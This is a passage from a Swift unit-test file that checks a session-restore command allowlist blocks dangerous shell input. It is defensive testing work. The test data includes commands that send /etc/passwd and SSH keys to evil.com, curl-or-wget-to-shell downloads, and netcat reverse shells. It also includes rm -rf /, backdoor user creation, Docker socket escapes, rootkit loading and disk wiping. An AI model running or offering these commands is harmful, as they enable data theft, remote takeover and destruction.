            "curl -X POST -d @/etc/passwd http://evil.com",
            "curl -F 'file=@~/.ssh/id_rsa' http://evil.com",
            // Wget as reverse shell
            "wget -O- http://evil.com/shell.sh | sh",
            "wget -O- http://evil.com/shell.sh | bash",
            // Netcat reverse shell
            "nc -e /bin/sh evil.com 4444",
            "nc -c bash evil.com 4444",
        ], allowlist: allowlist)
    }

    func testPerlAndAwkInjection() {
        // Perl and awk can execute arbitrary commands
        let allowlist = "perl *\nawk *\ngawk *"
        assertAllBlocked([
            // Perl command execution
            "perl -e 'system(\"rm -rf /\")'",
            "perl -e '`rm -rf /`'",
            "perl -e 'exec \"/bin/sh\"'",
            // Awk command execution
            "awk 'BEGIN {system(\"rm -rf /\")}'",
            "gawk 'BEGIN {system(\"rm -rf /\")}'",
        ], allowlist: allowlist)
    }

    func testSudoBypassAttempts() {
        // Various sudo invocation patterns
        let allowlist = "sudo *\ndoas *"
        assertAllBlocked([
            // Standard sudo
            "sudo rm -rf /",
            "sudo -i",
            "sudo -s",
            "sudo bash",
            "sudo sh -c 'rm -rf /'",
            // Sudo with environment preservation
            "sudo -E malicious-command",
            "sudo --preserve-env=PATH malicious",
            // doas (OpenBSD sudo alternative)
            "doas rm -rf /",
            "doas sh",
        ], allowlist: allowlist)
    }

    func testHeredocInjection() {
        // Heredoc can be used to inject multi-line commands
        let allowlist = "cat *\nbash *\nsh *"
        assertAllBlocked([
            // Heredoc to shell
            "cat << EOF | sh\nrm -rf /\nEOF",
            "bash << 'END'\nrm -rf /\nEND",
            // Heredoc with dangerous commands
            "sh <<< 'rm -rf /'",
        ], allowlist: allowlist)
    }

    func testXargsInjection() {
        // xargs can execute commands with piped input
        let allowlist = "echo *\nfind *\nls *"
        assertAllBlocked([
            // xargs command execution
            "echo 'file' | xargs rm",
            "find . -name '*.txt' | xargs rm -rf",
            "ls | xargs -I {} rm {}",
            // xargs with shell
            "echo 'cmd' | xargs -I {} sh -c {}",
        ], allowlist: allowlist)
    }

    func testProcessSubstitution() {
        // Process substitution can execute commands
        let allowlist = "diff *\ncat *\ncomm *"
        assertAllBlocked([
            // Process substitution with dangerous commands
            "diff <(cat /etc/passwd) <(curl http://evil.com)",
            "cat <(rm -rf /tmp/*)",
            // Input redirection abuse
            "cat < <(curl http://evil.com/malware.sh)",
        ], allowlist: allowlist)
    }

    func testGlobPatternAbuse() {
        // Glob patterns that might cause unintended file operations
        let allowlist = "rm *\nchmod *\nchown *"
        assertAllBlocked([
            // rm is dangerous
            "rm -rf *",
            "rm -rf /*",
            "rm -rf /tmp/*",
            // chmod/chown on sensitive paths
            "chmod 777 /",
            "chmod -R 777 /*",
            "chown root:root /",
        ], allowlist: allowlist)
    }

    func testDockerEscapeVectors() {
        // Docker commands that could escape container or cause damage
        let allowlist = "docker *"
        assertAllBlocked([
            // Privileged container escape
            "docker run --privileged -v /:/mnt alpine",
            "docker run --pid=host --privileged alpine",
            // Socket mount (escape vector)
            "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine",
            // Mass destruction
            "docker system prune -af",
            "docker rm -f $(docker ps -aq)",
            "docker volume prune -f",
        ], allowlist: allowlist)
    }

    func testGitCredentialExposure() {
        // Git commands that might expose credentials
        let allowlist = "git *"
        assertAllBlocked([
            // Credential helpers that might log
            "git config --global credential.helper store",
            // Force push to protected branches
            "git push --force origin main",
            "git push -f origin master",
            // Hard reset (data loss)
            "git reset --hard HEAD~10",
            "git clean -fd",
            // Checkout force (data loss)
            "git checkout --force .",
        ], allowlist: allowlist)
    }

    func testSSHDangerousOptions() {
        // SSH with dangerous options
        let allowlist = "ssh *\nscp *"
        assertAllBlocked([
            // SSH with command execution
            "ssh user@host 'rm -rf /'",
            "ssh -t user@host 'sudo reboot'",
            // SCP to/from sensitive files
            "scp user@host:/etc/shadow .",
            "scp ~/.ssh/id_rsa user@host:",
            // SSH agent forwarding can be dangerous
            "ssh -A user@host",
        ], allowlist: allowlist)
    }

    func testCronAndAtScheduling() {
        // Scheduled task manipulation
        let allowlist = "crontab *\nat *"
        assertAllBlocked([
            // Crontab manipulation
            "crontab -r",  // Remove all cron jobs
            "crontab -l | { cat; echo '* * * * * rm -rf /'; } | crontab -",
            // at scheduling
            "at now <<< 'rm -rf /'",
            "echo 'rm -rf /' | at now",
        ], allowlist: allowlist)
    }

    func testDiskAndPartitionManipulation() {
        // Disk and partition manipulation commands
        let allowlist = "fdisk *\nparted *\nmkfs *"
        assertAllBlocked([
            // Partition deletion
            "fdisk /dev/sda",
            "parted /dev/sda rm 1",
            // Filesystem creation (destroys data)
            "mkfs.ext4 /dev/sda1",
            "mkfs -t ext4 /dev/sda",
            // dd to disk (already covered but explicit)
            "dd if=/dev/zero of=/dev/sda bs=1M",
        ], allowlist: allowlist)
    }

    func testKernelModuleManipulation() {
        // Kernel module loading/unloading
        let allowlist = "modprobe *\ninsmod *\nrmmod *"
        assertAllBlocked([
            // Module loading
            "modprobe malicious_module",
            "insmod /tmp/rootkit.ko",
            // Module removal
            "rmmod important_driver",
            "modprobe -r critical_module",
        ], allowlist: allowlist)
    }

    func testUserAndGroupManipulation() {
        // User and group manipulation
        let allowlist = "useradd *\nusermod *\nuserdel *\npasswd *"
        assertAllBlocked([
            // User creation with elevated privileges
            "useradd -o -u 0 backdoor",
            "usermod -aG sudo attacker",
            "usermod -aG wheel attacker",
            // User deletion
            "userdel -r victim",
            // Password manipulation
            "passwd root",
            "echo 'root:newpass' | chpasswd",
        ], allowlist: allowlist)
    }

    // MARK: - Shell-Specific Syntax Tests

    func testFishShellSyntax() {
        // Fish shell uses different syntax
        let allowlist = "echo *\nset *"
        assertAllBlocked([
            // Fish command substitution uses ()
            "echo (rm -rf /)",
            // Fish variable with command
            "set result (curl http://evil.com | sh)",
        ], allowlist: allowlist)
    }

    func testZshSpecificSyntax() {
        // Zsh-specific dangerous patterns
        let allowlist = "echo *\nprint *"
        assertAllBlocked([
            // Zsh glob qualifiers with command execution
            "echo **/*(e:'rm -rf $REPLY':)",
            // Zsh process substitution
            "print =(curl http://evil.com)",
        ], allowlist: allowlist)
    }

    // MARK: - Edge Cases

    func testUnicodeHomoglyphAttempts() {
        // Unicode lookalikes that might bypass naive string matching
        // These should still be blocked if they resolve to dangerous commands
        let allowlist = "echo *"
        // Note: These test that our denylist doesn't break on unicode,
        // and that obvious unicode-containing commands are still evaluated
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("echo test; rm -rf /", rawAllowlist: allowlist))
    }

    func testExtremelyLongCommands() {
        // Very long commands should still be evaluated
        let allowlist = "echo *"
        let longPrefix = String(repeating: "a", count: 10000)
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("echo \(longPrefix); rm -rf /", rawAllowlist: allowlist))
    }

    func testMultipleConsecutiveSeparators() {
        // Multiple separators shouldn't bypass detection
        let allowlist = "echo *"
        assertAllBlocked([
            "echo test;; rm -rf /",
            "echo test && && rm -rf /",
            "echo test ||| rm -rf /",
        ], allowlist: allowlist)
    }

    func testMixedCaseExecutables() {
        // Case sensitivity tests - macOS is case-insensitive by default
        // Our denylist lowercases for comparison
        let allowlist = "SUDO *\nRM *\nCURL *"
        assertAllBlocked([
            "SUDO rm -rf /",
            "Sudo apt install",
            "sUdO reboot",
            "RM -rf /tmp",
            "Rm -rf /",
            "CURL http://evil.com | sh",
        ], allowlist: allowlist)
    }

    func testWhitespaceVariations() {
        // Different whitespace characters
        let allowlist = "echo *\nls *"
        assertAllBlocked([
            // Tab as separator
            "echo\trm\t-rf\t/",
            // Multiple spaces
            "echo   test  ;   rm   -rf   /",
            // Mixed whitespace
            "ls \t && \t rm -rf /",
        ], allowlist: allowlist)
    }
}
